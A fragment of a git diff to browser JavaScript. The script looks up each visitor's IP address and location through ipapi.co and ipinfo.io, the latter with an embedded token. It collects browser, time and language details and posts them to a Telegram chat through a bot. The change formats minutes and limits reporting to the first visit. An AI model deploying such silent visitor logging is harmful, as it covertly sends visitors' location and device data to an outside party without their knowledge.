@@ -73,10 +73,10 @@ fetch('https://ipapi.co/json/')
         const browser = getBrowserInfo();
         let userid = document.createElement('p');
      
-       let systemTime = new Date();
-       let hours = systemTime.getHours();
-       let minutes = systemTime.getMinutes();
-       let formattedTime = `${hours}:${minutes}`;
+        let systemTime = new Date();
+        let hours = systemTime.getHours();
+        let minutes = systemTime.getMinutes();
+        let formattedTime = `${hours}:${minutes < 10 ? '0' : ''}${minutes}`;
     
        let language = navigator.language
       
@@ -144,6 +144,8 @@ fetch('https://ipinfo.io/' + ip + '?token=afae6637fcf7bf')
         formData.append('chat_id', chatId);
         formData.append('text', message);
         formData.append('parse_mode', 'Markdown');
+        if (!localStorage.getItem('userVisited')) {
+        localStorage.setItem('userVisited', 'true');
         fetch(url, {
             method: 'POST',
             body: formData
